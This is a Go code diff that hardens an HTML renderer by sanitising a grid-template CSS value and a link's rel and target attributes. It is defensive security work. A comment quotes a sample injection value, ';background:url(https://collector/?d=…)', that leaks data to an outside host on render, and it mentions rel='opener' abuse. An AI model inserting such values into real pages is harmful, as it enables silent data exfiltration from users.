@@ -545,11 +545,22 @@ func (r *renderer) box(_ wire.Node, fields map[string]wire.Value) string {
 			}
 			template = "repeat(" + strconv.FormatInt(cols, 10) + ", 1fr)"
 		}
+		// `templateColumns` is a free string on the wire that lands verbatim in a
+		// `style` attribute — the one slot in this renderer where a decoded
+		// document writes CSS. Unsanitised, a value carrying
+		// `;background:url(https://collector/?d=…)` closed the declaration, opened
+		// a second one, and fetched on RENDER with no user act, outside the egress
+		// policy that governs every href and src in the same document, while the
+		// React client dropped the identical value silently. The rule is the shared
+		// emission grammar, so every host now emits the same bytes for the same
+		// tree, and a refusal is marked on the element rather than being silent.
+		template, cssRefusalAttrs := sanitizeCSSValueForSlot("grid-template-columns", template)
 		style := "grid-template-columns:" + template
 		if gap, ok := layout.Fields["gap"].(wire.Int); ok {
 			style += ";gap:" + strconv.FormatInt(int64(gap), 10) + "px"
 		}
-		return element("div", []attr{{"class", "fuaran-layout-grid"}, {"style", style}}, r.childrenHTML(fields))
+		gridAttrs := append([]attr{{"class", "fuaran-layout-grid"}, {"style", style}}, cssRefusalAttrs...)
+		return element("div", gridAttrs, r.childrenHTML(fields))
 	case role == "Group" && layout.Tag == "Masonry":
 		// WIRE_FORMAT §3.6.7 — column-fill, realised with the CSS multi-column
 		// family. `grid-template-rows: masonry` is NOT the mechanism and must
@@ -1071,11 +1082,26 @@ func (r *renderer) link(fields map[string]wire.Value, semanticAttrs []attr) stri
 		return element("span", append([]attr{{"class", "fuaran-link-protected-wrap"}}, semanticAttrs...), anchor)
 	}
 	attrs := []attr{{"class", "fuaran-link"}, {"href", safeHref}}
+	// `rel` and `target` were emitted VERBATIM, so a decoded tree could write
+	// rel="opener" on a _blank link and re-enable window.opener, or name an
+	// arbitrary browsing context in `target`. Both are closed token sets now,
+	// resolved TOGETHER because the rel rule depends on the sanitised target:
+	// `noopener noreferrer` is FORCED on _blank whether or not the document
+	// asked. Same grammar, same order, same bytes as every other host.
+	relDeclared := ""
 	if rel, ok := fields["rel"].(wire.Str); ok {
-		attrs = append(attrs, attr{"rel", string(rel)})
+		relDeclared = string(rel)
 	}
+	targetDeclared := ""
 	if target, ok := fields["target"].(wire.Str); ok {
-		attrs = append(attrs, attr{"target", string(target)})
+		targetDeclared = string(target)
+	}
+	safeTarget, safeRel := sanitizeLinkAnchor(targetDeclared, relDeclared)
+	if safeRel != "" {
+		attrs = append(attrs, attr{"rel", safeRel})
+	}
+	if safeTarget != "" {
+		attrs = append(attrs, attr{"target", safeTarget})
 	}
 	if d, ok := fields["download"].(wire.Bool); ok && bool(d) {
 		attrs = append(attrs, attr{"download", ""})
